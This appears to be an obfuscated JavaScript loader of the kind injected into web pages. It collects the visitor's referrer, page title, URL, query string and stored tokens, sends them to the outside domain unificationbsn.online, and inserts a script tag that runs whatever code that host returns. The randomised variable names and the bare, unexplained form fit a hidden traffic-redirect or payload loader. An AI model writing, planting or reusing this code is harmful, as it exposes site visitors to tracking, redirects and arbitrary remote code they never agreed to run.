(function() {
    var name = '_CspqVbrMrptbcCps';
    if (!window._CspqVbrMrptbcCps) {
        window._CspqVbrMrptbcCps = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/maris',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _YfvHztqJDY9xfdNg = localStorage.getItem('config');
    if (typeof _YfvHztqJDY9xfdNg !== 'undefined' && _YfvHztqJDY9xfdNg !== null) {
        var _rkswfQVfhmHVG9Fg = JSON.parse(_YfvHztqJDY9xfdNg);
        var _wD4QkyVF5VHXPh9d = Math.round(+new Date()/1000);
        if (_rkswfQVfhmHVG9Fg.created_at + window._CspqVbrMrptbcCps.ttl < _wD4QkyVF5VHXPh9d) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _Q4d1ZNN2XfRMQVdW = localStorage.getItem('subId');
    var _zvMsKpt4qR3n2KZW = localStorage.getItem('token');
    var _gNj1VgVgmbxR91SQ = '?return=js.client';
        _gNj1VgVgmbxR91SQ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _gNj1VgVgmbxR91SQ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _gNj1VgVgmbxR91SQ += '&default_keyword=' + encodeURIComponent(document.title);
        _gNj1VgVgmbxR91SQ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _gNj1VgVgmbxR91SQ += '&name=' + encodeURIComponent(name);
        _gNj1VgVgmbxR91SQ += '&host=' + encodeURIComponent(window._CspqVbrMrptbcCps.R_PATH);
    if (typeof _Q4d1ZNN2XfRMQVdW !== 'undefined' && _Q4d1ZNN2XfRMQVdW && window._CspqVbrMrptbcCps.unique) {
        _gNj1VgVgmbxR91SQ += '&sub_id=' + encodeURIComponent(_Q4d1ZNN2XfRMQVdW);
    }
    if (typeof _zvMsKpt4qR3n2KZW !== 'undefined' && _zvMsKpt4qR3n2KZW && window._CspqVbrMrptbcCps.unique) {
        _gNj1VgVgmbxR91SQ += '&token=' + encodeURIComponent(_zvMsKpt4qR3n2KZW);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._CspqVbrMrptbcCps.R_PATH + _gNj1VgVgmbxR91SQ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
